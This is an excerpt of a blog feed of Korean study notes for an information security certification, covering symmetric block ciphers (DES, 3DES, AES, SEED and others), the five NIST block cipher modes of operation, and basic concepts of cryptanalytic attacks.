          &lt;td style=&quot;text-align: center&quot;&gt;64&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;56&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;16&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;IDEA&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;유럽&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;1990년&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;PGP 채택&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;64&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;128&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;Rijndael&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;벨기에&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;2000년 AES알고리즘으로 선정&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;128&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;128,192,256&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;10,12,14&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;SEED&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;한국&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;1999년&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;한국표준 블록암호 알고리즘&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;128&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;128&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;16&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;CRYPTON&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;한국&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;1998년&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt; &lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;128&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;0-256&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;12&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;RC5&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;미국&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;1994년&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;알고리즘이 간단, 속도가 빠름&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;64&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;0-256&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;16&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;FEAL&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;일본&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;1987년&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;S/W구현에 적합&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;64&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;64&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;MISTY&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;일본&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;1996년&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;차분/선형공격에 안정성증명구조&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;64&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;128&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;SKIPJACK&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;미국&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;1990년&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;Fortezza카드에 사용&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;64&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;80&lt;/td&gt;
          &lt;td style=&quot;text-align: center&quot;&gt;32&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;현대 대칭키 암호를 이용한 암호화 기법
    &lt;ul&gt;
      &lt;li&gt;현대 블록 암호의 사용
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;기본개념
                &lt;ul&gt;
                  &lt;li&gt;블록 암호를 다양한 응용에 사용하기 위해 NIST에서 5가지 운영모드를 정의&lt;/li&gt;
                  &lt;li&gt;DES, AES를 포함한 어떤 대칭 블록 암호에도 적용 가능&lt;/li&gt;
                  &lt;li&gt;ECB모드 : Electric CodeBook mode (전자 부호표 모드)&lt;/li&gt;
                  &lt;li&gt;CBC모드 : Cipher Block Chaining mode (암호 블록 연쇄모드)&lt;/li&gt;
                  &lt;li&gt;CFB 모드 : Cipher-FeedBack mode (암호 피드백 모드)&lt;/li&gt;
                  &lt;li&gt;OFB 모드 : Output-FeedBack mode (출력 피드백 모드)&lt;/li&gt;
                  &lt;li&gt;CTR 모드 : CounTeR mode (카운터 모드)
                    &lt;ul&gt;
                      &lt;li&gt;CFB, OFB, CTR 모드 : 스트림 암호화 방식&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Electric CodeBook(ECB) 모드
            &lt;ul&gt;
              &lt;li&gt;개요
                &lt;ul&gt;
                  &lt;li&gt;가장 간단한 모드. 평문은 N개의 n비트 블록으로 분할&lt;/li&gt;
                  &lt;li&gt;평문 크기가 블록 크기의 배수가 아니라면, 평문의 마지막 블록은 다른 블록들과 동일한 크기로 만들기 위하여 padding이 필요&lt;/li&gt;
                  &lt;li&gt;각 블록에 키는 동일&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;응용
                &lt;ul&gt;
                  &lt;li&gt;매우 많은 데이터베이스를 암호화할 때 병렬적으로 처리 가능&lt;/li&gt;
                  &lt;li&gt;암호화된 레코드를 저장하거나 복호화 해야하는 분야에서 독립성이 유용&lt;/li&gt;
                  &lt;li&gt;다른 레코드에 영향을 주지 않음&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;암호화 예시
                &lt;ul&gt;
                  &lt;li&gt;P1 -&amp;gt; Enc(K1) = C1&lt;/li&gt;
                  &lt;li&gt;P2 -&amp;gt; Enc(K1) = C2&lt;/li&gt;
                  &lt;li&gt;P3 -&amp;gt; Enc(K1) = C3&lt;/li&gt;
                  &lt;li&gt;P4 -&amp;gt; Enc(K1) = C4&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Cipher Block Chaining(CBC) 모드
            &lt;ul&gt;
              &lt;li&gt;개요
                &lt;ul&gt;
                  &lt;li&gt;각각의 평문 블록은 암호화되기 전에 이전 암호화 블록과 XOR 됨&lt;/li&gt;
                  &lt;li&gt;블록이 암호화될 때 암호화블록은 전송되지만, 다음 블록 암호화를 위해 메모리에 저장됨&lt;/li&gt;
                  &lt;li&gt;첫 번째 블록은 이전 암호화 블록이 없으므로 초기벡터라고 불리는 허구의 블록이 사용됨&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;암호화와 복호화
                &lt;ul&gt;
                  &lt;li&gt;1단계 전에 수행되어 결과로 출력된 암호문 블록에 평문 블록을 XOR 하고 나서 암호화를 수행함&lt;/li&gt;
                  &lt;li&gt;복호화할 때 암호문 블록 1개가 파손된 경우, 평문 블록에 미치는 영향은 2개 블록에 머문다. 반면 평문 블록 한 비트 오류는 모든 암호문에 영향을 미친다.&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;CBC 모드 활용
                &lt;ul&gt;
                  &lt;li&gt;인터넷에서 보안을 제공하는 프로토콜 중 하나인 IPSec 에서 통신의 기밀성을 지키기 위해 CBC 모드를 사용&lt;/li&gt;
                  &lt;li&gt;3DES 를 CBC 모드로 사용한 3DES-CBC, AES를 CBC로 사용한 AES-CBC&lt;/li&gt;
                  &lt;li&gt;CBC 모드 인증으로 수행하는 대칭키 암호 시스템의 하나인 Kerberos version 5에서도 사용&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;암호화 예시
                &lt;ul&gt;
                  &lt;li&gt;P1 -&amp;gt; IV Xor -&amp;gt; Enc(K1) = C1&lt;/li&gt;
                  &lt;li&gt;P2 -&amp;gt; C1 Xor -&amp;gt; Enc(K2) = C2&lt;/li&gt;
                  &lt;li&gt;P3 -&amp;gt; C2 Xor -&amp;gt; Enc(K3) = C3&lt;/li&gt;
                  &lt;li&gt;P4 -&amp;gt; C3 Xor -&amp;gt; Enc(K4) = C4&lt;/li&gt;
                  &lt;li&gt;IV 가 바뀌면 암호문 블록 모두가 바뀌게 됨&lt;/li&gt;
                  &lt;li&gt;P1 가 바뀌면 암호문 블록 모두가 바뀌게 됨&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;복호화 예시
                &lt;ul&gt;
                  &lt;li&gt;C1 -&amp;gt; Dec(K1) -&amp;gt; IV Xor = P1&lt;/li&gt;
                  &lt;li&gt;C2 -&amp;gt; Dec(K2) -&amp;gt; C1 Xor = P2&lt;/li&gt;
                  &lt;li&gt;C3 -&amp;gt; Dec(K3) -&amp;gt; C2 Xor = P3&lt;/li&gt;
                  &lt;li&gt;C4 -&amp;gt; Dec(K4) -&amp;gt; C3 Xor = P4&lt;/li&gt;
                  &lt;li&gt;C2 가 손상되면 P2, P3가 영향을 받음
                    &lt;ul&gt;
                      &lt;li&gt;암호문 길이에는 변화가 없어야 함&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Cipher-FeedBack(CFB) 모드 / 스트림암호 방식 블록암호 모드
            &lt;ul&gt;
              &lt;li&gt;개요
                &lt;ul&gt;
                  &lt;li&gt;어떤 블록 암호도 스트림 암호로 바꿀 수 있다.&lt;/li&gt;
                  &lt;li&gt;스트림 암호의 경우 메시지의 길이가 블록의 정수배가 되도록 패딩 할 필요가 없으며 실시간으로 사용 가능&lt;/li&gt;
                  &lt;li&gt;한 문자를 전송하는 경우 문자 중심 스트림 암호를 이용하여 각 문자가 암호화되는 즉시 전송 가능&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;암호화와 복호화
                &lt;ul&gt;
                  &lt;li&gt;복호화 과정은 평문 블록과 암호문 블록의 역할만 바뀌었을 뿐 동일
                    &lt;ul&gt;
                      &lt;li&gt;CBC에서는 복호화 함수를 사용&lt;/li&gt;
                      &lt;li&gt;CFB에서는 암호화 함수를 복호화에 사용&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;DES 나 AES 와 같은 블록 암호를 이용한 운용 모드&lt;/li&gt;
                  &lt;li&gt;그 결과는 스트림암호와 같다.
                    &lt;ul&gt;
                      &lt;li&gt;키 스트림이 암호문에 의존하는 비동기식 스트림암호와 비슷&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;암호화 예시
                &lt;ul&gt;
                  &lt;li&gt;IV -&amp;gt; Enc(K1) -&amp;gt; P1 Xor = C1&lt;/li&gt;
                  &lt;li&gt;C1 -&amp;gt; Enc(K2) -&amp;gt; P2 Xor = C2&lt;/li&gt;
                  &lt;li&gt;C2 -&amp;gt; Enc(K3) -&amp;gt; P3 Xor = C3&lt;/li&gt;
                  &lt;li&gt;C3 -&amp;gt; Enc(K4) -&amp;gt; P4 Xor = C4&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;복호화 예시
                &lt;ul&gt;
                  &lt;li&gt;IV -&amp;gt; Enc(K1) -&amp;gt; C1 Xor = P1&lt;/li&gt;
                  &lt;li&gt;C1 -&amp;gt; Enc(K2) -&amp;gt; C2 Xor = P2&lt;/li&gt;
                  &lt;li&gt;C2 -&amp;gt; Enc(K3) -&amp;gt; C3 Xor = P3&lt;/li&gt;
                  &lt;li&gt;C3 -&amp;gt; Enc(K4) -&amp;gt; C4 Xor = P4&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;Output-FeedBack(OFB) 모드 / 스트림암호 방식 블록암호 모드
            &lt;ul&gt;
              &lt;li&gt;개요
                &lt;ul&gt;
                  &lt;li&gt;CFB 모드와 유사하지만 모든 암호문 블록의 각 비트는 이전 암호문 블록의 비트들과 독립적
                    &lt;ul&gt;
                      &lt;li&gt;오류 파급의 영향을 피할 수 있음&lt;/li&gt;
                      &lt;li&gt;오류 발생 시 다른 비트에 영향 안줌&lt;/li&gt;
                      &lt;li&gt;CFB와 마찬가지로 초기화 벡터 사용&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;스트림 암호로서의 OFB 모드
                    &lt;ul&gt;
                      &lt;li&gt;블록 암호를 기반으로 한 스트림 암호&lt;/li&gt;
                      &lt;li&gt;키 스트림은 평문이나 암호문과는 독립적이므로 동기식 스트림암호&lt;/li&gt;
                      &lt;li&gt;IV 암호화 -&amp;gt; 평문 블록과 XOR -&amp;gt; 암호화 블록 생성&lt;/li&gt;
                      &lt;li&gt;IV 암호화 결과를 암호화 -&amp;gt; 평문 블록과 XOR -&amp;gt; 암호화 블록 생성&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;암호화 예시
                &lt;ul&gt;
                  &lt;li&gt;IV -&amp;gt; Enc(K1) = I1 -&amp;gt; P1 Xor = C1&lt;/li&gt;
                  &lt;li&gt;I1 -&amp;gt; Enc(K2) = I2 -&amp;gt; P2 Xor = C2&lt;/li&gt;
                  &lt;li&gt;I2 -&amp;gt; Enc(K3) = I3 -&amp;gt; P3 Xor = C3&lt;/li&gt;
                  &lt;li&gt;I3 -&amp;gt; Enc(K4) = I4 -&amp;gt; P4 Xor = C4&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;복호화 예시
                &lt;ul&gt;
                  &lt;li&gt;IV -&amp;gt; Enc(K1) = I1 -&amp;gt; C1 Xor = P1&lt;/li&gt;
                  &lt;li&gt;I1 -&amp;gt; Enc(K2) = I2 -&amp;gt; C2 Xor = P2&lt;/li&gt;
                  &lt;li&gt;I2 -&amp;gt; Enc(K3) = I3 -&amp;gt; C3 Xor = P3&lt;/li&gt;
                  &lt;li&gt;I3 -&amp;gt; Enc(K4) = I4 -&amp;gt; C4 Xor = P4&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;초기치가 바뀌면 모든 암호문이 바뀜&lt;/li&gt;
              &lt;li&gt;암호화 알고리즘의 결과는 평문과는 무관하다&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;CounTeR(CTR) 모드 / 스트림암호 방식 블록암호 모드
            &lt;ul&gt;
              &lt;li&gt;개요
                &lt;ul&gt;
                  &lt;li&gt;ATM(asynchronous transfer mod) 네트워크 보안과 IPSec 에 응용되면서 관심이 늘어남.&lt;/li&gt;
                  &lt;li&gt;암호화 시 피드백이 존재하지 않음. -&amp;gt; 암/복호화 병렬처리가 가능&lt;/li&gt;
                  &lt;li&gt;키 스트림의 의사난수성은 카운터를 사용함으로써 성취될 수 있음&lt;/li&gt;
                  &lt;li&gt;CTR 값은 암호화 할 때마다 새로운 비표값으로 생성&lt;/li&gt;
                  &lt;li&gt;CTR 모드는 OFB 모드와 마찬가지로 이전 암호문 블록과 독립적인 키 스트림을 생성하지만 (동기식) 피드백을 사용하지 않음&lt;/li&gt;
                  &lt;li&gt;ECB 모드처럼 CTR 모드는 서로 독립적인 n비트 암호문 블록을 생성함
                    &lt;ul&gt;
                      &lt;li&gt;ECB와 CTR은 암복호화 병렬처리가 가능&lt;/li&gt;
                      &lt;li&gt;OFB : 병렬처리 불가&lt;/li&gt;
                      &lt;li&gt;CBC/CFB : 복호화만 병렬처리 가능&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;CTR 암호화 -&amp;gt; 평문블록과 XOR -&amp;gt; 암호화 블록 생성&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;암호화 예시
                &lt;ul&gt;
                  &lt;li&gt;CTR+0 -&amp;gt; Enc(K1) -&amp;gt; P1 Xor = C1&lt;/li&gt;
                  &lt;li&gt;CTR+1 -&amp;gt; Enc(K2) -&amp;gt; P2 Xor = C2&lt;/li&gt;
                  &lt;li&gt;CTR+2 -&amp;gt; Enc(K3) -&amp;gt; P3 Xor = C3&lt;/li&gt;
                  &lt;li&gt;CTR+3 -&amp;gt; Enc(K4) -&amp;gt; P4 Xor = C4&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;복호화 예시
                &lt;ul&gt;
                  &lt;li&gt;CTR+0 -&amp;gt; Enc(K1) -&amp;gt; C1 Xor = P1&lt;/li&gt;
                  &lt;li&gt;CTR+1 -&amp;gt; Enc(K2) -&amp;gt; C2 Xor = P2&lt;/li&gt;
                  &lt;li&gt;CTR+2 -&amp;gt; Enc(K3) -&amp;gt; C3 Xor = P3&lt;/li&gt;
                  &lt;li&gt;CTR+3 -&amp;gt; Enc(K4) -&amp;gt; C4 Xor = P4&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;블록 암호 공격
    &lt;ul&gt;
      &lt;li&gt;차분공격에 대한 기본 개념 (Differential Cryptanalysis)
        &lt;ul&gt;
          &lt;li&gt;선택 평문 공격&lt;/li&gt;
          &lt;li&gt;두 개의 평문 블록들의 비트의 차이에 대응되는 암호문 블록들의 비트의 차이를 이용하여 사용된 암호키를 찾는 방법&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;선형공격에 대한 기본 개념 (Linear Cryptanalysis)
        &lt;ul&gt;
          &lt;li&gt;기지 평문 공격&lt;/li&gt;
          &lt;li&gt;알고리즘 내부의 비선형 구조를 적당히 선형화시켜 암호키를 찾는 방법&lt;/li&gt;
          &lt;li&gt;평문과 암호문 비트를 XOR 하여 0이 되는 확률&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전수공격법 (Exhaustive key search)
        &lt;ul&gt;
          &lt;li&gt;암호화할 때 일어날 수 있는 모든 경우에 대해 조사&lt;/li&gt;
          &lt;li&gt;경우의 수가 적을 때 좋음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;통계적 분석 (Statistical analysis)
        &lt;ul&gt;
          &lt;li&gt;암호문에 대한 평문의 각 단어의 빈도에 관한 자료와 더불어 지금까지 알려진 모든 통계적인 자료를 이용하여 해독&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;수학적 분석 (Mathematical analysis)
        &lt;ul&gt;
          &lt;li&gt;통계적인 방법과 수학적 이론을 이용&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="대칭키 암호" /><summary type="html">대칭키 암호의 종류 DES (Data Encryption Standard) 개요 NIST(미국 국립기술표준원) 에서 1973년 국가적으로 사용할 대칭키 암호시스템 제안요청서를 발표 IBM의 제안으로 DES가 채택됨 FIPS(연방정보처리기준) 의 초안으로 공표 DES 발표 후 가장 널리 사용된 대칭키 블록 암호 이후 삼충 DES 사용을 권고한 FIPS 46-3 발표 최신 AES 는 DES 를 대체한 알고리즘 개관 평문의 길이는 64비트, 키의 길이는 56비트, 이보다 길면 64비트 블록으로 나눔 DES 구조는 Feistel 네트워크의 변형, 라운드 회수는 16 원래 키로부터 16개의 서브키를 생성하고 서브키를 각 라운드에서 사용 DES 복호화 과정은 암호화 과정과 동일 DES의 구조 개요 두 개의 전치(P-박스)와 16개의 Feistel 라운드 함수로 구성 P-박스는 초기 전치(initial Permutation) 과 최종 전치(Final Permutation) 임 암호화 Plain Text Plain Text (평문을 절반으로 자름) P-Box 1 Round R2 = L1 XOR F1(R1)&amp;lt;-K1 L2 = R2 … 16 Round (교차 없음) R16 = R15 L16 = L15 XOR F15(R15)&amp;lt;-K15 P-Box 64Bit 암호문(Cipher Text) 복호화도 동일하게 마지막 라운드에 교차 없음 라운드 함수 개요 DES 는 16번의 라운드 함수를 사용 각 라운드 함수는 Fiestal 암호로 되어있음 라운드 함수는 이전 라운드 함수의 출력 값 L-1 과 R-1 을 입력으로 받고 다음 라운드에 입력으로 전송될 L 과 R을 생성 각 라운드에는 2개의 암호 요소 혼합기(mixer) 와 교환기 (swapper) 가 있음, 이런 요소들은 역연산이 가능함 DES 함수 DES 의 핵심은 함수 라운드 함수에서 사용된 함수를 가리킴 DES 함수는 32비트 출력값을 산출하기 위해 가장 오른쪽의 32비트에 48비트 키를 적용 DES 함수는 확장 P-박스, 키 XOR, 8개의 S-박스 그리고 단순 P-박스의 4개 부분으로 구성 예시 32Bit 입력 확장 P-박스 (48Bit) 48Bit XOR Key (48Bit) S-Box (8개) 32Bit 출력 단순 P-박스 32Bit 결과 암호화 알고리즘과 복호화 알고리즘 라운드 키들이 역순으로 적용되어야 한다는 사실이 중요 암호화 과정에서 1라운드는 K1, 복호화 과정에서 1라운드는 K16 DES 분석 설계 기준 S-박스 각 라운드에서 그 다음 라운드까지 혼돈과 확산 성질을 만족하도록 설계 비선형 함수 입력 값의 한 비트를 바꾸면 출력 값에서 두 비트 이상 바뀜 P-박스 32비트에서 32비트로 가는 하나의 단순 P-박스 32비트에서 48비트로 가는 하나의 확장 P-박스 2개의 P-박스는 비트들을 동시에 확산(diffusion) 시킴 DES의 취약점 키의 크기(56비트) 키에 대한 전수 조사를 위해 2의 56승 키를 조사 전사공격 가능 다중 DES 사용 다중 DES 삼중 DES 개요 두 개의 키를 갖는 삼중 DES 와 세 개의 키를 갖는 삼중 DES가 있음 두 개의 키를 갖는 삼중 DES (DES-EDE2) 두 개의 키를 갖는 삼중 DES 에서는 k1과 k2 두 개의 키를 사용 첫 번째와 세번째 단계에서는 k1, 두 번째 단계에서는 k2를 사용 하나의 DES로 삼중 DES를 만들기 위하여 암호화 과정의 중간 단게에서는 복호화 알고리즘을 사용하고, 복호화 과정에서는 DES 암호화 알고리즘을 사용 기지평문 공격에 취약 세 개의 키를 갖는 삼중 DES (Triple-DES) 세 개의 키 k1, k2, k3 를 사용 P -&amp;gt; 암호화(k1) -&amp;gt; 복호화(k2) -&amp;gt; 암호화(k3) -&amp;gt; 암호문 PGP (이메일 보안, Pretty Good Privacy) 에서 사용 기지평문 공격 보완 복호화 : 암호화의 역 트리플 DES에서 모든 키를 동일하게 하면 3DES는 보통 DES와 같아짐 과거에 DES로 암호화된 암호문을 3DES를 사용하여 복호화 가능 AES 개요 역사 1997년 미국 국립기술표준원(NIST)은 DES를 대체하기 위해 Advanced Encryption Standard(AES) 암호 알고리즘을 공모 NIST의 제안 요청서 128비트 블록크기 128, 192, 256 비트의 세 가지 키 크기 공개 알고리즘으로 누구나 이용 가능해야 함 레인달(Rijndael) AES 알고리즘 선택 선정기준 안정성 비용 구현 효율성 라운드(Rounds) AES는 128비트 평문을 128비트 암호문으로 출력하는 알고리즘 Non-feistel 알고리즘 10 (128bit key), 12 (192bit key), 14 (256bit key) 라운드 사용 AES-128, AES-192, AES-256 으로 불림 암호(Ciphers) 개요 DES : Feistel 네트워크를 기본 구조로 사용 Rijndael : SPN (Substitution-Permutation Network) 구조 사용 연산은 바이트 단위의 연산을 사용 S-Box 를 이용한 치환, 행이동, 행연산 열변환, 키연산 열변환의 4가지 기본연산을 수행 알려진 공격방법들로부터 안전하도록 설계 하드웨어, 소프트웨어 구현 시 속도나 코드 압축성 면에서 효율적 SPN 구조 라운드 함수가 역변환이 되어야 한다는 등의 제약이 있음 더 많은 병렬성을 제공 입력을 여러 개의 소블록으로 나누고 각 소블록을 S-box에 입력하여 치환, S-box의 출력을 P-box로 전치하는 과정 반복 Feistel 과 SPN 구조 알고리즘 Feistel : DES, Blowfish, MISTY, RC5 SPN : IDEA, Rijndael (AES), Square DES 와 AES 의 비교</summary></entry><entry><title type="html">정보보안 - 블록 암호 / 스트림 암호</title><link href="https://bluesplatter.com/is_certification/IS-Management-Cryptography/" rel="alternate" type="text/html" title="정보보안 - 블록 암호 / 스트림 암호" /><published>2021-07-19T09:00:00+09:00</published><updated>2021-07-19T09:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Management-Cryptography</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Management-Cryptography/">&lt;h1 id=&quot;대칭키-암호&quot;&gt;대칭키 암호&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;대칭키 암호 = 공통키 암호&lt;/li&gt;
  &lt;li&gt;비대칭키 암호 = 공개키 암호&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;현대-블록-암호&quot;&gt;현대 블록 암호&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;개요
    &lt;ul&gt;
      &lt;li&gt;기본 개념
        &lt;ul&gt;
          &lt;li&gt;대칭키 블록 암호는 n-비트 평문 블록을 암호화하거나 n-비트 암호문블록을 복호화, k비트 키를 사용&lt;/li&gt;
          &lt;li&gt;복호화 알고리즘은 암호 알고리즘의 역함수, 동일한 비밀키를 사용&lt;/li&gt;
          &lt;li&gt;메시지의 길이가 n비트보다 작다면 n비트 블록을 만들기 위하여 padding 추가&lt;/li&gt;
          &lt;li&gt;대칭키 암호를 안전하게 사용하는 필수 사항
            &lt;ul&gt;
              &lt;li&gt;강한 암호 알고리즘이 있어야 함&lt;/li&gt;
              &lt;li&gt;비밀키를 안전한 방법으로 획득하고 보관해야 함&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;치환(Substitution) 과 전치(Transposition)
        &lt;ul&gt;
          &lt;li&gt;현대 블록 암호는 치환 암호 혹은 전치 암호로 동작
            &lt;ul&gt;
              &lt;li&gt;암호기법 : 치환, 전치, 블록, 스트림, 합성&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;치환 암호로 설계되면, 평문 비트의 값은 임의의 값으로 대체. (1-&amp;gt;0, 0-&amp;gt;1)
            &lt;ul&gt;
              &lt;li&gt;교환&lt;/li&gt;
              &lt;li&gt;평문과 암호문의 0과 1의 개수다 다르다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;전치 암호로 설계되면, 각각의 비트는 단지 재배열된다.
            &lt;ul&gt;
              &lt;li&gt;위치변경&lt;/li&gt;
              &lt;li&gt;0과 1중 하나의 값을 가질 수 있다.&lt;/li&gt;
              &lt;li&gt;n비트 평문 혹은 암호문의 개수는 2의 n승이다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;평문을 암호화할 경우 전치 암호의 특성(0과 1의 개수가 유지)는 전수조사 공격에 치명적이다.
            &lt;ul&gt;
              &lt;li&gt;보통 치환 암호로 설계한다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;현대 블록 암호의 구성요소
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;확산, 혼돈과 같은 성질을 만족시키기 위하여 전치 요소, 치환 요소, 그 밖의 요소로 결합&lt;/li&gt;
              &lt;li&gt;공격 방지 암호를 위해 이동요소(shift), 교환요소(swap), 분할요소(split), 조합요소 뿐만 아니라 전치 장치(transposition, P-box)와 치환 장치(substitution, S-box)와 XOR 연산의 조합으로 만듬.
                &lt;ul&gt;
                  &lt;li&gt;XOR 연산 : 같으면 0, 다르면 1&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
